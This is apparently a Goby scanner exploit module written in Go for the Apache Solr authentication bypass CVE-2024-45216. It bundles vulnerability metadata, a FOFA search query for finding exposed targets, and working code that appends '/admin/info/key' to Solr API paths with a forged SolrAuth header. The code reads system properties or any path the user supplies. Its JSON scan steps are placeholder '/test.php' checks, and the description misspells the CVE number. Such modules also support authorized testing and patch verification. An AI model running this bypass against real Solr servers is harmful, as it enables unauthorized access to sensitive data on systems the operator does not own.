package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"strings"
)

func init() {
	expJson := `{
    "Name": "Apache Solr /solr/admin/info/properties:/admin/info/key Permission Bypass Vulnerability(CVE-2024-45216)",
    "Description": "<p>Apache Solr is an open-source search server developed in Java language, mainly based on HTTP and Apache Lucene implementation. On October 16, 2024, Qiming Xingchen Group VSRC detected that Apache Solr had issued a security bulletin, fixing an authentication bypass vulnerability (CVE-224-45216) in Solr, with an official rating of \"serious\". The technical details and PoC of the vulnerability have been made public. There is an authentication bypass vulnerability when Apache Solr instances use the PKIAInformationPlugin (which may be enabled when Solr is started in SolrCloud mode and configured to use authentication). Attackers can bypass Solr's authentication mechanism by adding/admin/info/key at the end of the Solr API path, potentially accessing sensitive data or performing unauthorized operations.</p>",
    "Product": "APACHE-Solr",
    "Homepage": "http://lucene.apache.org/solr/",
    "DisclosureDate": "2024-10-31",
    "PostTime": "2024-10-31",
    "Author": "wangzhao@baimaohui.net",
    "FofaQuery": "title=\"Solr Admin\" && body=\"SolrCore Initialization Failures\"",
    "GobyQuery": "title=\"Solr Admin\" && body=\"SolrCore Initialization Failures\"",
    "Level": "1",
    "Impact": "<p>1. Attackers can access and obtain sensitive data, such as user information, corporate secrets, etc. </p><p>2. In some cases, attackers may exploit vulnerabilities to execute system commands and take control of affected systems.</p>",
    "Recommendation": "<p>Add user identity authentication mechanism or token verification to increase permission control over the function points of the system.</p>",
    "References": [
        "https://mp.weixin.qq.com/s/m48FGDUOnHDpRjh4k_mlhQ"
    ],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "mode",
            "type": "select",
            "value": "properties",
            "show": ""
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "Permission Bypass"
    ],
    "VulType": [
        "Permission Bypass"
    ],
    "CVEIDs": [
        "CVE-2024-45216"
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "7.6",
    "Translation": {
        "CN": {
            "Name": "Apache Solr /solr/admin/info/properties:/admin/info/key 权限绕过漏洞（CVE-2024-45216）",
            "Product": "APACHE-Solr",
            "Description": "<p>Apache Solr是一个开源搜索服务器，使用Java语言开发，主要基于HTTP和Apache Lucene实现。2024年10月16日，启明星辰集团VSRC监测到Apache Solr发布安全公告，修复了Solr中的一个身份验证绕过漏洞（CVE-2024-45216），官方评级为“严重”，目前该漏洞的技术细节及PoC已公开。Apache Solr实例使用PKIAuthenticationPlugin（当Solr 以 SolrCloud 模式启动并配置为使用身份验证时该插件可能被启用）时存在身份验证绕过漏洞，攻击者可通过在Solr API路径末尾添加/admin/info/key的方式来绕过Solr的认证机制，从而可能访问敏感数据或执行未授权操作。<br></p>",
            "Recommendation": "<p>加入用户身份认证机制或token验证，对系统的功能点增加权限控制。<br></p>",
            "Impact": "<p>1.攻击者可以访问并获取敏感数据，如用户信息、企业机密等。&nbsp;</p><p>2.部分情况下，攻击者可能利用漏洞执行系统命令，控制受影响的系统。<br></p>",
            "VulType": [
                "权限绕过"
            ],
            "Tags": [
                "权限绕过"
            ]
        },
        "EN": {
            "Name": "Apache Solr /solr/admin/info/properties:/admin/info/key Permission Bypass Vulnerability(CVE-2024-45216)",
            "Product": "APACHE-Solr",
            "Description": "<p>Apache Solr is an open-source search server developed in Java language, mainly based on HTTP and Apache Lucene implementation. On October 16, 2024, Qiming Xingchen Group VSRC detected that Apache Solr had issued a security bulletin, fixing an authentication bypass vulnerability (CVE-224-45216) in Solr, with an official rating of \"serious\". The technical details and PoC of the vulnerability have been made public. There is an authentication bypass vulnerability when Apache Solr instances use the PKIAInformationPlugin (which may be enabled when Solr is started in SolrCloud mode and configured to use authentication). Attackers can bypass Solr's authentication mechanism by adding/admin/info/key at the end of the Solr API path, potentially accessing sensitive data or performing unauthorized operations.<br></p>",
            "Recommendation": "<p>Add user identity authentication mechanism or token verification to increase permission control over the function points of the system.<br></p>",
            "Impact": "<p>1. Attackers can access and obtain sensitive data, such as user information, corporate secrets, etc.&nbsp;</p><p>2. In some cases, attackers may exploit vulnerabilities to execute system commands and take control of affected systems.<br></p>",
            "VulType": [
                "Permission Bypass"
            ],
            "Tags": [
                "Permission Bypass"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "Variables": {},
    "PocId": "9965"
}`

	postOrGet_4MOFgcJkvn := func(hostInfo *httpclient.FixUrl, fileUrl string) (string, error) {
		setGetRequest := func(hostInfo *httpclient.FixUrl, urlGet string, head map[string]string) (*httpclient.HttpResponse, error) {
			GetRequest := httpclient.NewGetRequestConfig(urlGet)
			GetRequest.Timeout = 15
			GetRequest.VerifyTls = false
			GetRequest.FollowRedirect = false
			for headName, headValue := range head {
				GetRequest.Header.Store(headName, headValue)
			}
			return httpclient.DoHttpRequest(hostInfo, GetRequest)
		}

		header := map[string]string{
			"User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 12_10) AppleWebKit/600.1.25 (KHTML, like Gecko) Version/12.0 Safari/1200.1.25",
			"SolrAuth":   "XXXXX",
		}

		resp, err := setGetRequest(hostInfo, fileUrl, header)
		if err != nil || resp.StatusCode != 200 {
			return "", err
		}

		// 注意：返回值为（最终要返回的读取结果，错误）
		return resp.RawBody, nil
	}

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, u *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			// 此处需要修改：设置成功后的vulurl
			vulURL := "/solr/admin/info/properties:/admin/info/key"
			// 此处需要修改：字典键为请求的URL地址，值为返回包判断成功的条件
			defaultModeMap := map[string]string{
				"/solr/admin/info/properties:/admin/info/key": "system.properties",
			}
			// 函数继承
			uploadFileFunc := postOrGet_4MOFgcJkvn

			// 请注意：后续代码为模板代码，非特殊情况，无需更改
			// ----------------------------------------------------------------------------------------------------------------------------------------------------
			for fileUrl, fileText := range defaultModeMap {
				resp, err := uploadFileFunc(u, fileUrl)
				if err != nil {
					continue
				}
				if strings.Contains(resp, fileText) {
					// 设置VULURL
					ss.VulURL = u.HostInfo + vulURL
					return true
				}
			}
			return false
		},

		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			var fileUrl string
			var fileText string
			mode := goutils.B2S(ss.Params["mode"])

			// 此处需要修改：字典键为用户选择读取文件的类型，值是一个数组，分别为请求的URL地址，返回包判断成功的条件
			defaultModeMap := map[string][2]string{
				"properties": {"/solr/admin/info/properties:/admin/info/key", "system.properties"},
			}
			// 此处需要修改：函数继承
			uploadFileFunc := postOrGet_4MOFgcJkvn

			// 请注意，后续代码为模板固化，正常情况下均无需修改
			// ----------------------------------------------------------------------------------------------------------------------------------------------------
			if mode == "Customize" {
				fileUrl = goutils.B2S(ss.Params["Customize"])
			} else {
				if _, ok := defaultModeMap[mode]; ok {
					fileUrl = defaultModeMap[mode][0]
					fileText = defaultModeMap[mode][1]
				} else {
					expResult.Success = false
					return expResult
				}
			}

			// 获取返回结果url和返回请求头
			resp, err := uploadFileFunc(expResult.HostInfo, fileUrl)
			if err != nil || (!strings.Contains(resp, fileText) && mode != "Customize") {
				expResult.Success = false
				return expResult
			}
			expResult.Success = true
			expResult.Output = "未授权访问 敏感信息泄露:\n" + resp
			return expResult
		},
	))
}
